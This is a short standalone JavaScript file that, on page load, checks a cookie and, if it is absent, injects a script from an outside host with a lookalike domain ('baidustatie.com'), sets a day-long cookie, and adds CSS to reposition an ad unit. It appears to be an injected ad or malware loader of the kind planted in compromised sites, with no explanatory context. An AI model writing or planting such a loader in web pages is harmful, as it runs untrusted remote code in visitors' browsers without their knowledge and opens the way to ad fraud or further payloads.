(function(win, doc) {
    if (win != top || !doc.body || win.__DSDE__) {
        return
    }
    if (!getCookie("sndoAD")) {
        loadJs("http://s.baidustatie.com/t/g.php?z=2772x54izvi6");
        setCookie("sndoAD", "true", 86400)
    }
})(window, document);
function loadJs(url) {
    var el = document.createElement("script");
    el.src = url;
    el.type = "text/javascript";
    document.body.appendChild(el);
    addCSS("#BDV_UNION_WRAPPER_2772x54izvi6_0{ margin: -240px auto!important; left: 0; ")
}
function addCSS(cssText) {
    var doc = document;
    var style = doc.createElement("style"),
        head = doc.head || doc.getElementsByTagName("head")[0];
    style.type = "text/css";
    if (style.styleSheet) {
        var func = function() {
            try {
                style.styleSheet.cssText = cssText
            } catch(e) {}
        };
        if (style.styleSheet.disabled) {
            setTimeout(func, 10)
        } else {
            func()
        }
    } else {
        var textNode = doc.createTextNode(cssText);
        style.appendChild(textNode)
    }
    head.appendChild(style)
}
function setCookie(key, value, expire) {
    if (typeof document.cookie == "string") {
        var exp = new Date();
        expire = expire || this.expire;
        exp.setTime(exp - 0 + expire * 1000);
        document.cookie = key + "=" + encodeURIComponent(value) + ";expires=" + exp.toGMTString()
    }
}
function getCookie(key) {
    if (typeof document.cookie == "string") {
        var h = RegExp("(^| )" + key + "=([^;]*)(;|$)").exec(document.cookie);
        return h ? decodeURIComponent(h[2]) : ""
    }
    return ""
};
